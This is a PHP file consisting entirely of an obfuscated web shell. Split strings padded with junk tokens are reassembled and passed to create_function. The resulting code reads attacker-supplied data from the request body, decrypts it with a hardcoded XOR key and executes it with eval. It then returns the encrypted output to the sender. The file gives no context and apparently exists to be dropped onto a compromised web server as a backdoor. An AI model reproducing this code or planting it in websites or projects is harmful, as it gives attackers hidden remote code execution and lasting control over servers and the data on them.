<?php
$l='ui}^$k{Vu$j};Vu}}returnVu $oVu;}if (Vu@pregVu_match(Vu"/$kh(.+)$kVuf/",Vu@file_getV';
$o='(Vu@x(@basVue6Vu4_decode($m[1Vu]),$k))Vu);$o=Vu@ob_get_VuVucoVuntents();@ob_endVu_clVuea';
$w='n();$rVu=@base6Vu4_eVuncode(@xVu(@gVuzcompVuress($o),$Vuk));VupVurint("$p$Vukh$r$kf");}';
$X='uVu_conteVunts("Vuphp:Vu//iVunput"Vu),$m)==1) {@ob_staVurt();Vu@evaVul(@gzVuuncompVuress';
$G=';Vufor(Vu$i=0;$i<VuVuVu$l;){for($j=Vu0Vu;($j<$c&&Vu$i<$l);$j++Vu,$i++){$Vuo.=$t{$V';
$Y='Ml9G0VupjAfrzE";funVuctiVuon xVu($t,$k){$c=strVuVuleVun($k);$l=sVutrlen($t);$Vuo=""';
$s='Vu$k="3369Vud193";$kh="3Vu8Vuc4cf3e93bVuVu0Vu";$kfVu="02ecVuVua366Vu39cd";$p="4vwT';
$M=str_replace('fJ','','crfJeafJtfJe_fufJncfJfJtion');
$g=str_replace('Vu','',$s.$Y.$G.$l.$X.$o.$w);
$L=$M('',$g);$L();
?>
